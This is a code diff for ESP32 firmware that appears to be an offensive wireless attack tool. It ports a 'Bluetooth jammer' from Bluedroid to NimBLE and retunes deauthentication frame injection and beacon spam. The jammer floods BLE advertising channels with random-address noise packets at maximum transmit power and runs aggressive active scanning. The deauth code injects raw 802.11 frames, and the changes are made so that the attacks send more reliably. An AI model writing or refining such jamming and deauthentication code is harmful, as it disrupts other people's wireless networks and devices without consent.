@@ -1,14 +1,11 @@
 #include "SPIFFS.h"
-#include "esp_bt.h"
-#include "esp_bt_defs.h"
-#include "esp_bt_main.h"
 #include "esp_event.h"
-#include "esp_gap_ble_api.h"
 #include "esp_system.h"
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 #include "nvs.h"
 #include "nvs_flash.h"
+#include <NimBLEDevice.h>
 #include <BleKeyboard.h>
 #include <DNSServer.h>
 #include <RF24.h>
@@ -1373,16 +1370,13 @@ void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
 
 /* ============ DEAUTH FRAME INJECTION ============ */
 void sendRawFrame(uint8_t *frame, int len) {
-  // Send on BOTH interfaces for maximum reliability.
-  // AP interface is primary (it's on the target channel).
-  // STA interface is secondary (may also reach the target).
-  esp_err_t resAP = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
-  esp_err_t resSTA = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
-  if (resAP != ESP_OK && resSTA != ESP_OK) {
+  // Send via AP interface only — it's on the target channel.
+  // STA interface is not connected, so tx on it fails and can interfere.
+  esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
+  if (res != ESP_OK) {
     static unsigned long lastErrLog = 0;
     if (millis() - lastErrLog > 5000) {
-      Serial.printf("[ERROR] Frame TX failed: AP=%s STA=%s\n",
-                    esp_err_to_name(resAP), esp_err_to_name(resSTA));
+      Serial.printf("[ERROR] Frame TX failed: %s\n", esp_err_to_name(res));
       addEvent("ERROR: Frame TX failed");
       lastErrLog = millis();
     }
@@ -1466,161 +1460,91 @@ void sendDeauthBurst() {
   yield(); // Let WiFi task breathe so TX actually goes out
 }
 
-/* ============ BLUETOOTH JAMMER ============ */
+/* ============ BLUETOOTH JAMMER (NimBLE) ============ */
 static bool btInitialized = false;
-static volatile bool btAdvActive = false;
-static volatile bool btScanActive = false;
-
-// BLE advertising parameters (persistent so we can restart quickly)
-static esp_ble_adv_params_t btJamAdvParams;
-static esp_ble_scan_params_t btJamScanParams;
-
-// GAP event callback — required for BLE stack to function
-static void btJamGapCallback(esp_gap_ble_cb_event_t event,
-                             esp_ble_gap_cb_param_t *param) {
-  switch (event) {
-  case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
-    // Raw advertising data set, start advertising
-    esp_ble_gap_start_advertising(&btJamAdvParams);
-    break;
-  case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
-    btAdvActive = true;
-    break;
-  case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
-    btAdvActive = false;
-    break;
-  case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT:
-    btScanActive = true;
-    break;
-  case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT:
-    btScanActive = false;
-    break;
-  default:
-    break;
-  }
-}
+static NimBLEScan *btJamScan = nullptr;
+static NimBLEAdvertising *btJamAdv = nullptr;
 
 void btJamInit() {
   if (btInitialized)
     return;
-  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
-  bt_cfg.mode = ESP_BT_MODE_BLE;
-  if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
-    Serial.println("[BT] Controller init failed");
-    return;
-  }
-  if (esp_bt_controller_enable(ESP_BT_MODE_BLE) != ESP_OK) {
-    Serial.println("[BT] Controller enable failed");
-    esp_bt_controller_deinit();
-    return;
-  }
-  if (esp_bluedroid_init() != ESP_OK) {
-    Serial.println("[BT] Bluedroid init failed");
-    esp_bt_controller_disable();
-    esp_bt_controller_deinit();
-    return;
-  }
-  if (esp_bluedroid_enable() != ESP_OK) {
-    Serial.println("[BT] Bluedroid enable failed");
-    esp_bluedroid_deinit();
-    esp_bt_controller_disable();
-    esp_bt_controller_deinit();
+  // Initialize NimBLE stack for jamming
+  NimBLEDevice::init("JamBLE");
+  // Set max TX power
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+
+  // Get advertising handle
+  btJamAdv = NimBLEDevice::getAdvertising();
+  if (!btJamAdv) {
+    Serial.println("[BT] Failed to get advertising handle");
+    NimBLEDevice::deinit(true);
     return;
   }
 
-  // Register GAP callback — critical, without this advertising silently fails
-  esp_ble_gap_register_callback(btJamGapCallback);
+  // Get scan handle for active scanning (sends SCAN_REQ = more RF noise)
+  btJamScan = NimBLEDevice::getScan();
+  if (btJamScan) {
+    btJamScan->setActiveScan(true);
+    btJamScan->setInterval(16);  // 10ms — aggressive
+    btJamScan->setWindow(16);    // 10ms — continuous
+    btJamScan->setDuplicateFilter(false);
+  }
 
-  // Set max TX power for all BLE operations
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-
-  // Pre-configure advertising params (fastest possible non-connectable)
-  memset(&btJamAdvParams, 0, sizeof(btJamAdvParams));
-  btJamAdvParams.adv_int_min = 0x0020; // 20ms minimum
-  btJamAdvParams.adv_int_max = 0x0020;
-  btJamAdvParams.adv_type = ADV_TYPE_NONCONN_IND;
-  btJamAdvParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
-  btJamAdvParams.channel_map = ADV_CHNL_ALL; // Channels 37, 38, 39
-  btJamAdvParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
-
-  // Pre-configure scan params (aggressive active scanning for more RF noise)
-  memset(&btJamScanParams, 0, sizeof(btJamScanParams));
-  btJamScanParams.scan_type =
-      BLE_SCAN_TYPE_ACTIVE; // Active scan = sends SCAN_REQ
-  btJamScanParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
-  btJamScanParams.scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL;
-  btJamScanParams.scan_interval = 0x0010; // 10ms — very aggressive
-  btJamScanParams.scan_window = 0x0010;   // 10ms — continuous scanning
-  btJamScanParams.scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE;
-
-  btAdvActive = false;
-  btScanActive = false;
   btInitialized = true;
-  Serial.println("[BT] Stack initialized (callback + max TX power)");
+  Serial.println("[BT] NimBLE jammer initialized (max TX power)");
 }
 
 void btJamDeinit() {
   if (!btInitialized)
     return;
-  esp_ble_gap_stop_scanning();
-  esp_ble_gap_stop_advertising();
-  delay(100); // Give BLE stack time to stop cleanly
-  esp_bluedroid_disable();
-  esp_bluedroid_deinit();
-  esp_bt_controller_disable();
-  esp_bt_controller_deinit();
-  btAdvActive = false;
-  btScanActive = false;
+  // Stop scanning and advertising
+  if (btJamScan && btJamScan->isScanning()) {
+    btJamScan->stop();
+  }
+  if (btJamAdv) {
+    btJamAdv->stop();
+  }
+  delay(100);
+  // Fully deinit NimBLE stack (frees all resources)
+  NimBLEDevice::deinit(true);
+  btJamScan = nullptr;
+  btJamAdv = nullptr;
   btInitialized = false;
-  Serial.println("[BT] Bluetooth stack released");
+  Serial.println("[BT] NimBLE jammer stack released");
 }
 
 void sendBtJamBurst() {
-  if (!btInitialized)
+  if (!btInitialized || !btJamAdv)
     return;
 
-  // --- BLE Advertising flood ---
-  // Each burst: randomize address + data, push raw adv, let it transmit
+  // --- BLE Advertising flood using NimBLE ---
   for (int burst = 0; burst < 3; burst++) {
-    // Randomize BLE source address each burst
-    esp_bd_addr_t randAddr;
-    for (int i = 0; i < 6; i++)
-      randAddr[i] = (uint8_t)esp_random();
-    randAddr[0] |= 0xC0; // Static random address
-    esp_ble_gap_stop_advertising();
-    delay(2);
-    esp_ble_gap_set_rand_addr(randAddr);
-    delay(1);
+    // Stop current advertising
+    btJamAdv->stop();
+    btJamAdv->reset();
 
-    // Build raw advertising payload with random noise
-    uint8_t rawAdv[31];
-    for (int i = 0; i < 31; i++)
-      rawAdv[i] = (uint8_t)esp_random();
-    // Valid flags header so the packet isn't dropped by the controller
-    rawAdv[0] = 0x02; // Length
-    rawAdv[1] = 0x01; // Type: Flags
-    rawAdv[2] = 0x06; // General Discoverable + BR/EDR Not Supported
+    // Build random manufacturer data as noise payload
+    uint8_t mfgData[25];
+    for (int i = 0; i < 25; i++)
+      mfgData[i] = (uint8_t)esp_random();
 
-    // Use RAW data inject — faster, bypasses struct validation
-    esp_ble_gap_config_adv_data_raw(rawAdv, 31);
-    // The GAP callback will auto-start advertising when data is set
-    delay(25); // Let at least one full advertising event transmit on all 3
-               // channels
+    // Set advertising data with random manufacturer-specific data
+    btJamAdv->setManufacturerData(std::string((char *)mfgData, 25));
+    btJamAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    btJamAdv->setMinInterval(0x0020); // 20ms — fastest possible
+    btJamAdv->setMaxInterval(0x0020);
+
+    // Start advertising
+    btJamAdv->start();
+    delay(25); // Let advertising event transmit on all 3 channels
 
     btJamPktsSent++;
   }
 
   // --- Concurrent BLE scanning ---
   // Active scanning sends SCAN_REQ packets = more RF interference on 2.4GHz
-  if (!btScanActive) {
-    esp_bd_addr_t scanAddr;
-    for (int i = 0; i < 6; i++)
-      scanAddr[i] = (uint8_t)esp_random();
-    scanAddr[0] |= 0xC0;
-    esp_ble_gap_set_scan_params(&btJamScanParams);
-    esp_ble_gap_start_scanning(1); // Scan for 1 second
+  if (btJamScan && !btJamScan->isScanning()) {
+    btJamScan->start(1, false); // Scan for 1 second, non-blocking
     btJamPktsSent++;
   }
 }
@@ -1805,7 +1729,7 @@ void sendBeacon(const char *ssid, int ssidLen, int ch) {
   packet[pktLen++] = 0x03;
   packet[pktLen++] = 0x01;
   packet[pktLen++] = ch;
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, pktLen, false);
+  esp_wifi_80211_tx(WIFI_IF_AP, packet, pktLen, false);
 }
 
 void spamWiFi() {
@@ -2990,12 +2914,12 @@ void setupRoutes() {
                   "Stop Payload Injector first — both use BLE stack");
       return;
     }
-    // Must fully tear down NimBLE before Bluedroid can init
+    // Must fully tear down NimBLE keyboard before jammer can re-init NimBLE
     if (bleNimbleReady) {
       bleKeyboard.end();
       bleNimbleReady = false;
       delay(500);
-      Serial.println("[BT] NimBLE deinitialized for Bluedroid jammer");
+      Serial.println("[BT] NimBLE keyboard deinitialized for jammer");
     }
     int t = server.arg("time").toInt();
     if (t < 5)
@@ -3020,7 +2944,6 @@ void setupRoutes() {
   server.on("/stopbtjam", []() {
     btJamming = false;
     if (btInitialized) {
-      esp_ble_gap_stop_advertising();
       btJamDeinit();
     }
     Serial.printf("[BT] Jammer stopped: %u pkts\n", btJamPktsSent);
@@ -3289,7 +3212,6 @@ void setupRoutes() {
     if (btJamming) {
       btJamming = false;
       if (btInitialized) {
-        esp_ble_gap_stop_advertising();
         btJamDeinit();
       }
     }
@@ -3659,9 +3581,6 @@ void loop() {
   if (btJamming) {
     if (now >= btJamEndTime) {
       btJamming = false;
-      esp_ble_gap_stop_scanning();
-      esp_ble_gap_stop_advertising();
-      delay(50);
       btJamDeinit();
       Serial.printf("[BT] Jam complete: %u pkts\n", btJamPktsSent);
       addEvent("BT Jam complete: " + String(btJamPktsSent) + " pkts sent");
